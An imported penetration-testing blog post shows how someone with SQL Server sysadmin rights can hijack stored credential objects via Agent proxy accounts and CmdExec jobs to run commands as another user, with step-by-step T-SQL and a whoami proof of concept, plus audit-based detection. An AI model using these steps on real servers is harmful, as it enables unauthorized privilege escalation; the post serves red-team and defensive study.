---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-09-10_hijacking-sql-server-credentials-using-agent-jobs-for-domain-privilege-escalatio.md
original_filename: 2024-09-10_hijacking-sql-server-credentials-using-agent-jobs-for-domain-privilege-escalatio.md
title: 'Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation '
category: documents
detected_topics:
- command-injection
- cloud-security
- sso
- access-control
- sqli
- otp
tags:
- imported
- documents
- command-injection
- cloud-security
- sso
- access-control
- sqli
- otp
language: en
raw_sha256: 338d6b9d9847389b55715a6178f512eec37d710389fa57cc2f3d8404fc4fb503
text_sha256: 36f780ac2e51c98188904cfe440fe5f6e7e80ca2fd31343cec76f0d8c737377d
ingested_at: '2026-06-28T07:32:38Z'
sensitivity: unknown
redactions_applied: false
---

# Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation 

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-09-10_hijacking-sql-server-credentials-using-agent-jobs-for-domain-privilege-escalatio.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security, sso, access-control, sqli, otp
- Ingested At: 2026-06-28T07:32:38Z
- Redactions Applied: False
- Raw SHA256: `338d6b9d9847389b55715a6178f512eec37d710389fa57cc2f3d8404fc4fb503`
- Text SHA256: `36f780ac2e51c98188904cfe440fe5f6e7e80ca2fd31343cec76f0d8c737377d`


## Content

---
title: "Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation "
page_title: "Exploiting SQL Server Credentials for Domain Privilege Escalation"
url: "https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/"
final_url: "https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/"
authors: ["Scott Sutherland"]
bugs: ["Privilege escalation"]
publication_date: "2024-09-10"
added_date: "2024-09-18"
source: "pentester.land/writeups.json"
original_index: 12
---

[Technical](/blog/technical-blog/#post-container) / Network Pentesting 

# Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation 

September 10, 2024

### [Scott Sutherland  ](/authors/scott-sutherland/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)
  * [](https://twitter.com/intent/tweet?text=Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation &url=https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/&title=Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation )

![Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation ](https://www.netspi.com/wp-content/uploads/2024/09/091024_TECH_Hijacking-SQL-Server-Credentials_Feature.webp)

In this blog I’ll introduce SQL Server credential objects and discuss how they can be abused by threat actors to execute code as either a SQL Server login, local Windows user, or Domain user. I’ll also cover how to enable logging that can be used to detect the associated behavior. This should be interesting to penetration testers, red teamers, and DBAs looking for legitimate authentication work arounds. 

## The Scenario 

Let’s start by painting a picture of a common scenario and the problem we are trying to solve with this technique. 

  1. You are a penetration tester or red teamer.
  2. You have obtained sysadmin privilege on a SQL Server instance through a common attack vector, such as SQL Injection, weak password, excessive privilege, or misconfigured SQL Server link.
  3. You can execute commands and code on the host operating system in the context of the SQL Server service account using a variety of techniques like xp_cmdshell, custom CLRs, agent jobs, etc.
  4. The problem is that the SQL Server service account is configured to run as _NT Service\MSSQLSERVER_ , which is an account with limited privileges on the operating system. As testers we want local administrator privileges at a minimum and Domain Admin if we are lucky. So, we need to find a workaround.
  5. Given the limitations of the _NT Service\MSSQLSERVER_ account, our next step is often attempting to escalate privileges locally. There are many OS-centric approaches to privilege escalation in Windows including, but not limited to #[AllThePotatoes](https://github.com/CCob/SweetPotato). However, I wanted to consider how SQL Server credentials could potentially be abused in this scenario if they have been configured on a SQL Server instance. 

Let’s explore the idea. 

## What is a Credential Object in SQL Server? 

Credentials are objects in SQL Server that store information, such as usernames and passwords, which can be used to authenticate to external resources like other SQL Servers, file shares, or web services, and execute processes/tasks in the context of another user. Credential types include SQL Server logins, local Windows users, and Active Directory domain users. 

Some common subsystems in SQL Server that use credentials include: 

  * Agent Jobs
  * SQL Server Integration Services (SSIS)
  * SQL Server Reporting Services (SSRS)
  * Linked Servers 
  * Database Mail 
  * Service Broker 
  * Replication 

There are many legitimate use cases for credential objects in SQL Server, but like all stored authentication tokens, they can be targeted and abused by threat actors. 

## How can I Recover the Usernames and Passwords Stored in Credential Objects? 

Obtaining cleartext passwords can be incredibly useful during privilege escalation. So how do we recover them from the SQL Server credential objects? The big hurdle is encryption. The information stored in credential objects is encrypted through the process described [here](https://learn.microsoft.com/en-us/sql/relational-databases/security/encryption/sql-server-encryption?view=sql-server-ver16). 

Fortunately, Antti Rantasaari developed a PowerShell script in 2014 that decrypts the credentials stored in SQL Server objects. He also provided a detailed blog [post](https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-credential-passwords/) outlining the decryption process. This script has since been ported to the [Get-DecryptedObject](https://github.com/dataplat/dbatools/blob/7ad0415c2f8a58d3472c1e85ee431c70f1bb8ae4/private/functions/Get-DecryptedObject.ps1#L7) function within the DBATools module by Chrissy LeMaire, who has maintained it actively. 

To run Antti’s function, import his PowerShell function, and run the command below. 

Get-MSSQLCredentialPasswords 

However, before you start down that path you should know there are some requirements.

**Available**| **Requirement**| **Description**  
---|---|---  
Yes| One or more credential objects must have been created in the SQL Server instance to recover passwords.| In our scenario, we assume credential objects have been created. However, in the real world you will have to confirm that.  
Yes| Sysadmin privilege| In our scenario we have this.  
Yes| DAC connection| With sysadmin rights we can establish one through [OS command execution](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/diagnostic-connection-for-database-administrators?view=sql-server-ver16) or ad-hoc [queries](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-DACQuery.sql).  
No| Local Administrator Privileges| Local administrator privileges are required to read the encryption material from _SOFTWARE\Microsoft\Microsoft SQL Server\\[instancename]\Security\Entropy. Service\MSSQLSERVER_ account does NOT have access to that registry key.__  
  
In our scenario, we do not meet all the necessary requirements to recover cleartext passwords from the credential objects. Antti Rantasaari’s technique is highly effective, but it requires that we already have local administrative privileges on the Windows system hosting the SQL Server instance. Without these administrative privileges, the technique cannot be applied. So, what are our options if we don’t have local administrative privileges? 

## How can I Abuse SQL Server Credential Objects without Local Administrator Access? 

As discussed earlier, credential objects in SQL Server are designed to enable access to external resources and execute tasks in the context of another user. This means that we do not need to recover the cleartext usernames and passwords stored in credential objects to run code in another user’s context—we can leverage the functionality as it was designed. 

Below is a process that can be used to “hijack” an existing credential object configured on the SQL Server instance, allowing you to execute code in the provided user’s context using SQL Server Agent jobs. No password or local OS administrator privileges required. 🙂 

**Lab Setup**

  1. Install SQL Server. 
  2. Create a local Windows user named _testuser_ and make it a local administrator. 

  
  
  net user testuser P@ssw0rd! /add 
  net localgroup administrators /add testuser 

  3. Log into the SQL Server and create the credential object. 

  
  
  CREATE CREDENTIAL [MyCredential] 
  WITH IDENTITY = 'yourcomputernamehere\testuser',  
  SECRET = 'P@ssw0rd!'; 

**Credential Impersonation Walkthrough**

  1. Log into the SQL Server instance. Verify that you have sysadmin access. 

  
  
  SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture1.webp)

  2. List credentials. The query below will provide you with a list of credentials configured on the SQL Server instance. If any exist, you’re halfway there. 

  
  
  SELECT * FROM sys.credentials 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture2.webp)

  3. List proxy accounts. Proxy accounts are tied to the credential object and used by the agent jobs. Leveraging an existing proxy account can reduce the likelihood of detection. 

  
  
  USE msdb; 
  GO 
  
  SELECT  
  proxy_id, 
  name AS proxy_name, 
  credential_id, 
  enabled 
  FROM  
  dbo.sysproxies; 
  GO 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture3.webp)

  4. Create a proxy account. If a proxy account doesn’t already exist for the credential object we want to abuse/impersonate, then we can create one and assign it the required privileges. For more information on proxy accounts check out <https://learn.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy?view=sql-server-ver16>. 

  
  
  USE msdb; 
  GO 
  
  EXEC sp_add_proxy  
  @proxy_name = N'MyCredentialProxy',  -- Name of the proxy 
  @credential_name = N'MyCredential';  -- Name of the existing credential 
  
  EXEC sp_grant_proxy_to_subsystem  
  @proxy_name = N'MyCredentialProxy',  
  @subsystem_id = 3; -- 3 represents the Operating System (CmdExec) subsystem 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture4.webp)

  5. Verify the proxy account was created.

  
  
  USE msdb; 
  GO 
  
  SELECT  
  proxy_id, 
  name AS proxy_name, 
  credential_id, 
  enabled 
  FROM  
  dbo.sysproxies; 
  GO 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture5.webp)

  6. Create an Agent job to execute your desired code or commands on the operating system. Available default options include PowerShell, VBScript, JScript, and CMDEXEC. Ensure that the job is configured with the appropriate proxy account. In the proof-of-concept example below, the process simply creates a file named whoami.txt in the C:\Windows\Temp\ folder to demonstrate that the process was executed in the proxy user’s context. 

  
  
  USE msdb; 
  GO 
  
  -- Create the job 
  EXEC sp_add_job  
  @job_name = N'WhoAmIJob'; -- Name of the job 
  
  -- Add a job step that uses the proxy to execute the whoami command 
  EXEC sp_add_jobstep  
  @job_name = N'WhoAmIJob',  
  @step_name = N'ExecuteWhoAmI',  
  @subsystem = N'CmdExec',  
  @command = N'c:\windows\system32\cmd.exe /c whoami > c:\windows\temp\whoami.txt',  
  @on_success_action = 1,  -- 1 = Quit with success 
  @on_fail_action = 2,  -- 2 = Quit with failure 
  @proxy_name = N'MyCredentialProxy';  -- The proxy created earlier 
  
  -- Add a schedule to the job (optional, can be manual or scheduled) 
  EXEC sp_add_jobschedule  
  @job_name = N'WhoAmIJob',  
  @name = N'RunOnce',  
  @freq_type = 1,  -- 1 = Once 
  @active_start_date = 20240820,  
  @active_start_time = 120000;  
  
  -- Add the job to the SQL Server Agent 
  EXEC sp_add_jobserver  
  @job_name = N'WhoAmIJob',  
  @server_name = N'(LOCAL)';  

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture6.webp)

  7. Use the query below to verify that the proxy account is being used by the Agent. The query will also list all other Agent jobs that are configured to run using proxy accounts. 

  
  
  USE msdb; 
  GO 
  
  SELECT  
  jobs.name AS JobName, 
  steps.step_id AS StepID, 
  steps.step_name AS StepName, 
  proxies.name AS ProxyName, 
  ISNULL(credentials.name, 'No Credential') AS CredentialName, 
  ISNULL(credentials.credential_identity, 'No Identity') AS IdentityName 
  FROM  
  msdb.dbo.sysjobs AS jobs 
  JOIN  
  msdb.dbo.sysjobsteps AS steps ON jobs.job_id = steps.job_id 
  JOIN  
  msdb.dbo.sysproxies AS proxies ON steps.proxy_id = proxies.proxy_id 
  LEFT JOIN  
  sys.credentials AS credentials ON proxies.credential_id = credentials.credential_id 
  WHERE  
  steps.proxy_id IS NOT NULL 
  ORDER BY  
  jobs.name, steps.step_id; 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture7.webp)

  8. Execute the Agent job so that a process will be started in the context of the proxy account and execute your code/command. 

  
  
  EXEC sp_start_job @job_name = N'WhoAmIJob'; 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture8.webp)

  9. Confirm execution by reviewing the c:\windows\temp\whoami.txt file contents. 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture9-1024x644.webp)

So, to recap, we were able to execute commands on the host operating system using the credentials without needing to know the associated username or password. However, at this point, if you were able to impersonate a user with local administrative privileges you can also recover the cleartext username and password from configured credential objects using Antti’s technique. 

## Detection and Hunting Opportunities 

The previous section was great for attackers, but not so great for defenders. Below is an overview of some detection opportunities for the good guys.

**Data Source:** Application Logs  
**Detection Strategy:** Behavior  
**Detection Concept:** To detect abuse of credential objects using proxy accounts, create server and database audit specifications that can identify when a proxy account is created by monitoring for the execution of the ‘sp_add_proxy’ and ‘sp_grant_proxy_to_subsystem’ stored procedures. SQL Server can also be configured to send those events to the Windows Application log where monitoring can be enabled for event ID 33205.  
**Known Detection Consideration:** Some database administrators may use credentials and proxy accounts for legitimate purposes, but it should not happen at a regular cadence. 

**Detection Configuration Instructions:**

  1. Create the Server Audit. 

  
  
  Use master 
  
  CREATE SERVER AUDIT [ProxyAccountAudit]  
  TO APPLICATION_LOG  
  WITH (ON_FAILURE = CONTINUE);  
  GO

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture10.webp)

  2. Create the Database Audit Specification. This captures server-level and database-level changes in the msdb database. 

  
  
  USE msdb;  
  GO  
  
  CREATE DATABASE AUDIT SPECIFICATION [ProxyAccountAuditSpec]  
  FOR SERVER AUDIT [ProxyAccountAudit]  
  ADD (EXECUTE ON OBJECT::[dbo].[sp_add_proxy] BY [dbo]),  
  ADD (EXECUTE ON OBJECT::[dbo].[sp_grant_proxy_to_subsystem] BY [dbo])  
  WITH (STATE = ON);  
  GO 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture11.webp)

  3. Enable the specification. 

  
  
  Use master 
  GO 
  ALTER SERVER AUDIT [ProxyAccountAudit] WITH (STATE = ON); 
  GO 
  Use msdb  
  GO 
  ALTER DATABASE AUDIT SPECIFICATION [ProxyAccountAuditSpec]  
  WITH (STATE = ON);  
  GO 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture12.webp)

  4. If you rerun the proxy account creation steps and review the Windows Application Log for event ID 33205, you should see instances of the ‘sp_add_proxy’ and ‘sp_grant_proxy_to_subsystem’ stored procedure execution. 

![](https://www.netspi.com/wp-content/uploads/2024/08/091024_TECH_Hijacking-SQL-Server-Credentials-using-Agent-Jobs-for-Domain-Privilege-Escalation_Picture13.webp)

## Wrap Up 

If you’d like to explore my previous offensive security work related to SQL Server, you can find it at [powerupsql.com](http://powerupsql.com/). The site includes the PowerUpSQL code, [SQL attack templates](https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql), [Detection Templates](https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server-Detective-Control-Cheat-Sheet), [privilege escalation cheatsheets](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet), blogs, and presentations focused on hacking SQL Server.

Note: I have not attempted to test this technique against Azure SQL Databases yet, but my preliminary research indicates credentials are not supported.

PS: A big thank you to Brian from 7 Minute Security (@7MinSec – [7minsec.com](http://7minsec.com/)) for outlining the scenario/problem space that led to this solution.

### Authors:

[ ![Headshot of Scott Sutherland](https://www.netspi.com/wp-content/uploads/2025/02/Scott-Sutherland.webp) Scott Sutherland VP, Research ](/authors/scott-sutherland)

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
